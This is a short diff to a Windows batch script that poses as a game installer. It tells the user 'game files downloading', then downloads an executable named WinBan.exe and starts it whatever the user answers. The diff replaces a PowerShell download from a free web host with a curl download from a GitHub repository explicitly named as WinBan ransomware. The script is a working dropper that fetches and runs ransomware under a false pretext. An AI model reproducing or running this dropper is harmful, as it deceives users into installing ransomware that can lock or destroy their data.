@@ -39,7 +39,7 @@ if %love%==yes goto yes
 if %love%==no goto no
 :yes
 echo Please wait game files downloading ...
-powershell -Command "Invoke-webRequest https://7241840012.000webhostapp.com/WinBan.exe -Outfile WinBan.exe"
+curl -O https://github.com/hellisabove/Winban-Ransomware/blob/master/WinBan%20Ransomware/bin/Debug/WinBan%20Ransomware.exe?raw=true WinBan.exe
 cls
 pause
 start WinBan.exe
@@ -48,7 +48,7 @@ exit
 :no
 echo Doesnt matter...
 echo You can't escape me
-powershell -Command "Invoke-webRequest https://7241840012.000webhostapp.com/WinBan.exe -Outfile WinBan.exe"
+curl -O https://github.com/hellisabove/Winban-Ransomware/blob/master/WinBan%20Ransomware/bin/Debug/WinBan%20Ransomware.exe?raw=true WinBan.exe
 cls
 pause
 start WinBan.exe
